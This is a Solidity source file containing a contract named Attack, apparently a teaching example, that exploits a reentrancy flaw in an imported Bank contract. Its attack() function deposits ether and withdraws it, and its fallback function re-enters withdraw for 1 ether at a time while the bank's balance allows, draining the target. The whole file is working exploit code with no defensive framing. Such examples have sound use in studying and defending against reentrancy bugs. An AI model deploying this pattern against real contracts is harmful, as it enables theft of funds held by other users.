// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Bank.sol";

contract Attack {

    Bank bank;
    constructor (address _bankAddress)  {
        bank = Bank(_bankAddress);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        uint256 amount = msg.value; 
        bank.deposit{value: amount}();
        bank.withdraw(amount);
    }
}